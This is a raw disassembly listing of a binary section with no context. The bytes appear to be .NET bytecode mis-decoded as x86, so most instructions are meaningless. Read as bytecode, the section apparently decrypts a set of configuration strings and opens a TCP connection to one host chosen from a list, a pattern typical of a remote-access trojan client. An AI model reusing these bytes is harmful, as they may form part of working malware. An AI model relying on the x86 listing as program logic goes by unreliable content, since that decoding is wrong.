  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	c5 01                	lds    (%ecx),%eax
  4028e3:	00 70 80             	add    %dh,-0x80(%eax)
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	78 02                	js     0x4028ef
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	2b 03                	sub    (%ebx),%eax
  4028f7:	00 70 80             	add    %dh,-0x80(%eax)
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	3f                   	aas
  402900:	03 00                	add    (%eax),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	51                   	push   %ecx
  40290a:	03 00                	add    (%eax),%eax
  40290c:	70 80                	jo     0x40288e
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	ab                   	stos   %eax,%es:(%edi)
  402914:	03 00                	add    (%eax),%eax
  402916:	70 80                	jo     0x402898
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	5e                   	pop    %esi
  40291e:	04 00                	add    $0x0,%al
  402920:	70 80                	jo     0x4028a2
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	61                   	popa
  402928:	16                   	push   %ss
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	14 1e                	adc    $0x1e,%al
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	c7                   	(bad)
  40293c:	1e                   	push   %ds
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	7a 1f                	jp     0x402966
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	2d 20 00 70 80       	sub    $0x80700020,%eax
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	31 20                	xor    %esp,(%eax)
  402961:	00 70 80             	add    %dh,-0x80(%eax)
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	e4 20                	in     $0x20,%al
  4029a3:	00 70 28             	add    %dh,0x28(%eax)
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 ee 20 00       	add    $0x20ee72,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	ee                   	out    %al,(%dx)
  402aa0:	20 00                	and    %al,(%eax)
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 f0 20    	add    %esp,0x20f07216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
